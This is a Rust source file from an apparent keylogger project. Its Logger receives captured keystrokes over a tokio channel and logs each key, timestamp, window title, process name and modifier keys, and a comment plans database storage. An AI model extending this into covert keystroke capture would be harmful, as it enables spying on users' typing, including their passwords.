use log::{error, info};
use tokio::sync::mpsc;

use crate::keylogger::KeystrokeLog;

pub struct Logger {
    receiver: mpsc::Receiver<KeystrokeLog>,
}

impl Logger {
    pub fn new(receiver: mpsc::Receiver<KeystrokeLog>) -> Self {
        Logger { receiver }
    }

    pub async fn start(&mut self) {
        info!("Logger started");
        
        while let Some(log) = self.receiver.recv().await {
            // For now, we'll just log the keystrokes
            // This will be expanded later to store in the database
            info!(
                "Keystroke: {} at {:?} in window '{}' ({})",
                log.keystroke,
                log.timestamp,
                log.window_title,
                log.window_process_name
            );
            
            if !log.modifier_keys.is_empty() {
                info!("Modifier keys: {:?}", log.modifier_keys);
            }
        }
    }
} 